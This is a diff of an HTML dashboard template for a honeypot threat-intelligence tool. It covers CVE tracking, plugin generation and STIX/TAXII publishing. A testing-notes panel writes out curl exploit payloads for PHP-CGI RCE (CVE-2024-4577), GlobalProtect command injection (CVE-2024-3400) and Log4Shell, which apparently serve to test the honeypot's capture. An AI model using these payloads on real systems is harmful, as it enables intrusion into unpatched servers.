@@ -1,67 +1,210 @@
 {% extends "base.html" %}
 {% block title %}Dashboard · HoneyForge Intel{% endblock %}
 {% block content %}
-<div class="flex items-center justify-between mb-6">
-  <h1 class="text-2xl font-bold text-white">Threat intelligence dashboard</h1>
-  <form method="post" action="/cves/watch-now">
-    <button class="btn-primary">Poll KEV + NVD now</button>
-  </form>
-</div>
+<div class="space-y-6">
 
-<div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
-  <div class="card">
-    <div class="text-slate-400 text-xs uppercase">CVEs tracked</div>
-    <div class="text-3xl font-bold text-white mt-1">{{ cve_total }}</div>
-    <div class="text-xs text-slate-500 mt-1">{{ cve_new }} new · {{ cve_deployed }} deployed</div>
-  </div>
-  <div class="card">
-    <div class="text-slate-400 text-xs uppercase">In CISA KEV</div>
-    <div class="text-3xl font-bold text-fuchsia-400 mt-1">{{ kev_total }}</div>
-    <div class="text-xs text-slate-500 mt-1">Actively exploited</div>
-  </div>
-  <div class="card">
-    <div class="text-slate-400 text-xs uppercase">Plugin drafts</div>
-    <div class="text-3xl font-bold text-amber-300 mt-1">{{ plugin_drafts }}</div>
-    <div class="text-xs text-slate-500 mt-1">{{ plugin_total }} total</div>
-  </div>
-  <div class="card">
-    <div class="text-slate-400 text-xs uppercase">Unique IOCs</div>
-    <div class="text-3xl font-bold text-sky-400 mt-1">
-      {{ ioc_counts.values() | sum }}
+  <!-- Header with status -->
+  <div class="flex items-center justify-between">
+    <div>
+      <h1 class="text-2xl font-bold text-white flex items-center gap-3">
+        Threat Intelligence Dashboard
+        <span class="inline-flex items-center gap-1.5 text-xs font-mono text-emerald-400 bg-emerald-900/30 px-2 py-1 rounded-full ring-1 ring-emerald-700/50">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 pulse-live"></span>
+          LIVE
+        </span>
+      </h1>
+      <p class="text-sm text-slate-500 mt-1 font-mono">Auto-pipeline: CVE → Plugin → Deploy → Capture → STIX</p>
     </div>
-    <div class="text-xs text-slate-500 mt-1">
-      {% for t,n in ioc_counts.items() %}{{ t }}: {{ n }}{% if not loop.last %} · {% endif %}{% endfor %}
+    <div class="flex gap-2">
+      <form method="post" action="/pipeline/run-now">
+        <button class="btn">⚡ Run Pipeline</button>
+      </form>
+      <form method="post" action="/cves/watch-now">
+        <button class="btn-primary">🔍 Poll KEV + NVD</button>
+      </form>
     </div>
   </div>
-</div>
 
-<div class="card">
-  <div class="flex items-center justify-between mb-4">
-    <h2 class="text-lg font-semibold text-white">Most recent CVEs</h2>
-    <a class="link text-sm" href="/cves">view all →</a>
+  <!-- Stats grid -->
+  <div class="grid grid-cols-2 lg:grid-cols-5 gap-4">
+    <div class="card-glow">
+      <div class="flex items-center justify-between">
+        <div class="text-slate-500 text-xs uppercase tracking-wider">CVEs Tracked</div>
+        <svg class="w-5 h-5 text-cyan-500/50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"/></svg>
+      </div>
+      <div class="text-3xl font-bold text-white mt-2 font-mono">{{ cve_total }}</div>
+      <div class="text-xs text-slate-500 mt-1">{{ cve_new }} new · {{ cve_deployed }} deployed</div>
+    </div>
+    <div class="card" style="box-shadow: 0 0 20px rgba(217, 70, 239, 0.1); border-color: rgba(217, 70, 239, 0.2);">
+      <div class="flex items-center justify-between">
+        <div class="text-slate-500 text-xs uppercase tracking-wider">CISA KEV</div>
+        <svg class="w-5 h-5 text-fuchsia-500/50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+      </div>
+      <div class="text-3xl font-bold text-fuchsia-400 mt-2 font-mono">{{ kev_total }}</div>
+      <div class="text-xs text-slate-500 mt-1">Actively exploited in wild</div>
+    </div>
+    <div class="card" style="box-shadow: 0 0 20px rgba(245, 158, 11, 0.1); border-color: rgba(245, 158, 11, 0.2);">
+      <div class="flex items-center justify-between">
+        <div class="text-slate-500 text-xs uppercase tracking-wider">Plugins</div>
+        <svg class="w-5 h-5 text-amber-500/50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>
+      </div>
+      <div class="text-3xl font-bold text-amber-300 mt-2 font-mono">{{ plugin_total }}</div>
+      <div class="text-xs text-slate-500 mt-1">{{ plugin_drafts }} drafts pending</div>
+    </div>
+    <div class="card" style="box-shadow: 0 0 20px rgba(34, 197, 94, 0.1); border-color: rgba(34, 197, 94, 0.2);">
+      <div class="flex items-center justify-between">
+        <div class="text-slate-500 text-xs uppercase tracking-wider">IOCs</div>
+        <svg class="w-5 h-5 text-emerald-500/50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+      </div>
+      <div class="text-3xl font-bold text-emerald-400 mt-2 font-mono">{{ ioc_counts.values() | sum }}</div>
+      <div class="text-xs text-slate-500 mt-1">
+        {% for t,n in ioc_counts.items() %}{{ t }}:{{ n }}{% if not loop.last %} · {% endif %}{% endfor %}
+        {% if not ioc_counts %}no data yet{% endif %}
+      </div>
+    </div>
+    <div class="card" style="box-shadow: 0 0 20px rgba(99, 102, 241, 0.1); border-color: rgba(99, 102, 241, 0.2);">
+      <div class="flex items-center justify-between">
+        <div class="text-slate-500 text-xs uppercase tracking-wider">TAXII Feed</div>
+        <svg class="w-5 h-5 text-indigo-500/50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
+      </div>
+      <div class="text-lg font-bold text-indigo-400 mt-2 font-mono">/taxii2/</div>
+      <div class="text-xs text-slate-500 mt-1">3 collections · STIX 2.1</div>
+    </div>
   </div>
-  <table class="data">
-    <thead><tr><th>CVE</th><th>Product</th><th>Severity</th><th>CVSS</th><th>Source</th><th>Status</th></tr></thead>
-    <tbody>
-    {% for c in recent_cves %}
-      <tr>
-        <td><a class="link font-mono" href="/cves/{{ c.cve_id }}">{{ c.cve_id }}</a></td>
-        <td>{{ c.vendor }} {{ c.product }}</td>
-        <td>
-          <span class="chip chip-{{ c.severity[:4] if c.severity else 'low' }}">
-            {{ c.severity or 'n/a' }}
-          </span>
-        </td>
-        <td class="font-mono">{{ c.cvss or '—' }}</td>
-        <td>
-          {% if c.in_kev %}<span class="chip chip-kev">KEV</span>{% else %}<span class="text-slate-500">NVD</span>{% endif %}
-        </td>
-        <td><span class="chip chip-{{ c.status.split('_')[0] }}">{{ c.status }}</span></td>
-      </tr>
-    {% else %}
-      <tr><td colspan="6" class="text-slate-500 text-center py-6">No CVEs yet — click <b>Poll KEV + NVD now</b> above.</td></tr>
-    {% endfor %}
-    </tbody>
-  </table>
+
+  <!-- Pipeline visualization -->
+  <div class="card">
+    <h2 class="text-sm font-semibold text-slate-400 uppercase tracking-wider mb-4">Intelligence Pipeline</h2>
+    <div class="flex items-center gap-2 overflow-x-auto pb-2">
+      <div class="flex-shrink-0 rounded-lg bg-cyan-950/50 ring-1 ring-cyan-800/50 px-4 py-3 text-center min-w-[120px]">
+        <div class="text-lg">🔍</div>
+        <div class="text-xs font-medium text-cyan-300 mt-1">CVE Watch</div>
+        <div class="text-[10px] text-slate-500 font-mono mt-0.5">every 6h</div>
+      </div>
+      <svg class="w-5 h-5 text-slate-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+      <div class="flex-shrink-0 rounded-lg bg-amber-950/50 ring-1 ring-amber-800/50 px-4 py-3 text-center min-w-[120px]">
+        <div class="text-lg">🤖</div>
+        <div class="text-xs font-medium text-amber-300 mt-1">Gen Plugin</div>
+        <div class="text-[10px] text-slate-500 font-mono mt-0.5">LLM/template</div>
+      </div>
+      <svg class="w-5 h-5 text-slate-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+      <div class="flex-shrink-0 rounded-lg bg-emerald-950/50 ring-1 ring-emerald-800/50 px-4 py-3 text-center min-w-[120px]">
+        <div class="text-lg">🚀</div>
+        <div class="text-xs font-medium text-emerald-300 mt-1">Deploy</div>
+        <div class="text-[10px] text-slate-500 font-mono mt-0.5">hot-reload</div>
+      </div>
+      <svg class="w-5 h-5 text-slate-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+      <div class="flex-shrink-0 rounded-lg bg-red-950/50 ring-1 ring-red-800/50 px-4 py-3 text-center min-w-[120px]">
+        <div class="text-lg">⚔️</div>
+        <div class="text-xs font-medium text-red-300 mt-1">Capture</div>
+        <div class="text-[10px] text-slate-500 font-mono mt-0.5">Censys/attacks</div>
+      </div>
+      <svg class="w-5 h-5 text-slate-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+      <div class="flex-shrink-0 rounded-lg bg-violet-950/50 ring-1 ring-violet-800/50 px-4 py-3 text-center min-w-[120px]">
+        <div class="text-lg">🧬</div>
+        <div class="text-xs font-medium text-violet-300 mt-1">IOC Extract</div>
+        <div class="text-[10px] text-slate-500 font-mono mt-0.5">every 10m</div>
+      </div>
+      <svg class="w-5 h-5 text-slate-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+      <div class="flex-shrink-0 rounded-lg bg-indigo-950/50 ring-1 ring-indigo-800/50 px-4 py-3 text-center min-w-[120px]">
+        <div class="text-lg">📦</div>
+        <div class="text-xs font-medium text-indigo-300 mt-1">STIX/TAXII</div>
+        <div class="text-[10px] text-slate-500 font-mono mt-0.5">auto-publish</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Recent CVEs table -->
+  <div class="card">
+    <div class="flex items-center justify-between mb-4">
+      <h2 class="text-sm font-semibold text-slate-400 uppercase tracking-wider">Recent CVEs</h2>
+      <a class="link text-xs" href="/cves">view all →</a>
+    </div>
+    <table class="data">
+      <thead><tr><th>CVE</th><th>Product</th><th>Severity</th><th>CVSS</th><th>Source</th><th>Status</th></tr></thead>
+      <tbody>
+      {% for c in recent_cves %}
+        <tr>
+          <td><a class="link font-mono text-xs" href="/cves/{{ c.cve_id }}">{{ c.cve_id }}</a></td>
+          <td class="text-slate-300">{{ c.product or c.vendor }}</td>
+          <td>
+            <span class="chip chip-{{ c.severity or 'low' }}">{{ c.severity or 'n/a' }}</span>
+          </td>
+          <td class="font-mono text-xs">{{ c.cvss or '—' }}</td>
+          <td>
+            {% if c.in_kev %}<span class="chip chip-kev">KEV</span>{% else %}<span class="text-slate-600 text-xs">NVD</span>{% endif %}
+          </td>
+          <td><span class="chip chip-{{ c.status.split('_')[0] if c.status else 'new' }}">{{ c.status or 'new' }}</span></td>
+        </tr>
+      {% else %}
+        <tr><td colspan="6" class="text-slate-600 text-center py-8 font-mono text-xs">
+          No CVEs yet — click <span class="text-cyan-400">Poll KEV + NVD</span> above
+        </td></tr>
+      {% endfor %}
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Deployment & Testing Notes -->
+  <div class="grid lg:grid-cols-2 gap-6">
+    <div class="terminal">
+      <div class="terminal-header flex items-center justify-between">
+        <div class="terminal-dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div>
+        <span class="text-xs text-slate-500 font-mono">deployment-notes.md</span>
+      </div>
+      <div class="p-4 text-xs font-mono text-slate-400 space-y-2">
+        <p class="text-emerald-400"># Deployment Checklist</p>
+        <p class="text-slate-500">─────────────────────────────────</p>
+        <p><span class="text-cyan-400">1.</span> <code>make up</code> — start all Docker services</p>
+        <p><span class="text-cyan-400">2.</span> <code>make expose</code> — ngrok tunnel for public access</p>
+        <p><span class="text-cyan-400">3.</span> Poll KEV+NVD to seed CVE database</p>
+        <p><span class="text-cyan-400">4.</span> Generate plugins (auto or manual)</p>
+        <p><span class="text-cyan-400">5.</span> <code>make reload-http</code> — load new plugins</p>
+        <p><span class="text-cyan-400">6.</span> Wait for scanner traffic (5-15 min)</p>
+        <p class="text-slate-500">─────────────────────────────────</p>
+        <p class="text-amber-400"># Port Mapping</p>
+        <p>  :22  → :2222 (SSH honeypot)</p>
+        <p>  :80  → :8080 (HTTP honeypot)</p>
+        <p>  :8090 (Intel UI + TAXII)</p>
+        <p>  :5601 (Kibana)</p>
+        <p class="text-slate-500">─────────────────────────────────</p>
+        <p class="text-red-400"># Security</p>
+        <p>  • Block egress from honeypot containers</p>
+        <p>  • Never expose :8090/:5601 to internet</p>
+        <p>  • Rotate SSH keys: <code>make rotate</code></p>
+      </div>
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-header flex items-center justify-between">
+        <div class="terminal-dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div>
+        <span class="text-xs text-slate-500 font-mono">testing-notes.md</span>
+      </div>
+      <div class="p-4 text-xs font-mono text-slate-400 space-y-2">
+        <p class="text-emerald-400"># Testing the Honeypot</p>
+        <p class="text-slate-500">─────────────────────────────────</p>
+        <p class="text-amber-400"># Test CVE-2024-4577 (PHP-CGI RCE)</p>
+        <p>curl "http://&lt;honeypot&gt;/index.php?\</p>
+        <p>  %ADd+allow_url_include=1\</p>
+        <p>  +%ADd+auto_prepend_file=php://input" \</p>
+        <p>  -d '&lt;?php system("id"); ?&gt;'</p>
+        <p></p>
+        <p class="text-amber-400"># Test CVE-2024-3400 (GlobalProtect)</p>
+        <p>curl "http://&lt;honeypot&gt;/ssl-vpn/hipreport.esp" \</p>
+        <p>  -H "Cookie: SESSID=/../../../tmp/x\`id\`"</p>
+        <p></p>
+        <p class="text-amber-400"># Test Log4Shell</p>
+        <p>curl "http://&lt;honeypot&gt;/" \</p>
+        <p>  -H "User-Agent: \${jndi:ldap://x/a}"</p>
+        <p class="text-slate-500">─────────────────────────────────</p>
+        <p class="text-cyan-400"># Verify IOC extraction</p>
+        <p>  1. Send test exploit above</p>
+        <p>  2. IOCs page → Extract now</p>
+        <p>  3. Check IPs/URLs appear</p>
+        <p>  4. Download STIX bundle</p>
+      </div>
+    </div>
+  </div>
+
 </div>
 {% endblock %}
